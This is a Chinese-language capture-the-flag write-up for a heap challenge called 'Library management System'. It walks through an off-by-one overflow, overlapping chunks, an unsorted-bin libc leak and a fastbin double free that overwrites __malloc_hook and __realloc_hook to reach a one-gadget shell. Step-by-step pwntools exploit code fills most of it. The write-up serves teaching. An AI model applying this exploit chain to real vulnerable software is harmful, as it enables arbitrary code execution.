# Library management System

## 题目简述

程序按用户指定长度逐字节读取标题，但循环条件写成 `i <= size`，可以越界写入下一堆块一个字节。利用该 off-by-one 修改相邻 chunk 的 `size`，制造覆盖 chunk；从 unsorted bin 泄露 libc 后，再通过重叠指针形成 fastbin double free，把 `__malloc_hook` 劫持到 `realloc+13`，由 `__realloc_hook` 跳转 one-gadget。

## 解题过程

漏洞函数等价于：

```c
for (i = 0; i <= size; ++i) {
    if (read(0, &byte, 1) != 1)
        exit(-1);
    if (byte == '\n')
        break;
    *(data + i) = byte;
}
```

当恰好输入 `size + 1` 字节时，最后一个字节会覆盖下一 chunk 的 `size` 低字节。先布置四个 chunk：

```python
add(0x18, b"aa\n")  # 0
add(0x68, b"aa\n")  # 1
add(0x68, b"aa\n")  # 2
add(0x18, b"aa\n")  # 3，阻止向 top chunk 合并
```

释放 0 号块后重新取回它，并用越界字节 `0xe1` 把 1 号块原来的 `0x71` 改成 `0xe1`：

```python
delete(0)
add(0x18, b"A" * 0x18 + b"\xe1")  # 新 0 号块
delete(1)
```

`free(1)` 现在按伪造的 `0xe0` 大小处理该块，形成覆盖 2 号块的 unsorted-bin chunk。再次申请 `0x68` 会从它前部切下一块，残留的 unsorted-bin 指针可由 `show(1)` 泄露：

```python
add(0x68, b"\n")
show(1)

leak = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
libc.address = leak - 0x3C4C48  # 题目 libc 中 main_arena+88
```

再申请两个同尺寸块。由于索引 2 仍指向被覆盖区域，新索引 4 与它指向同一物理 chunk；按 `2 -> 5 -> 4` 释放即可绕过相邻重复检查，形成 fastbin dup：

```python
add(0x68, b"aa\n")  # 4，与 2 重叠
add(0x68, b"bb\n")  # 5
delete(2)
delete(5)
delete(4)
```

目标地址与 one-gadget 为：

```python
malloc_hook = libc.sym["__malloc_hook"]
realloc = libc.sym["realloc"]
one_gadget = libc.address + 0x4527A  # 约束：[rsp+0x30] == NULL
```

把 fastbin 的 `fd` 改为 `__malloc_hook - 0x23`，连续申请后即可在 hook 前方得到可写区域：

```python
add(0x68, p64(malloc_hook - 0x23) + b"\n")
add(0x68, b"aa\n")
add(0x68, b"aa\n")
add(
    0x68,
    b"A" * 0x0B
    + p64(one_gadget)   # __realloc_hook
    + p64(realloc + 13) # __malloc_hook
    + b"\n",
)
```

没有直接把 `__malloc_hook` 写成 one-gadget，是因为普通 `malloc` 调用时栈条件不满足。令 `__malloc_hook = realloc+13` 后，`realloc` 开头的一组 `push` 会调整 `rsp`，随后 `realloc` 调用相邻的 `__realloc_hook`，从而在满足约束的栈布局下进入 one-gadget。最后再触发一次新增操作即可取得 shell。官方 PDF 未保留动态 flag。

## 方法总结

单字节越界的价值取决于相邻元数据布局；本题通过修改 `size` 制造 unsorted-bin 覆盖，先解决地址泄露，再利用重叠指针构造 fastbin dup。hook 劫持后仍要检查 one-gadget 约束，不能把“控制函数指针”直接等同于“稳定 getshell”；`realloc+偏移` 是为栈条件服务的二次跳板。
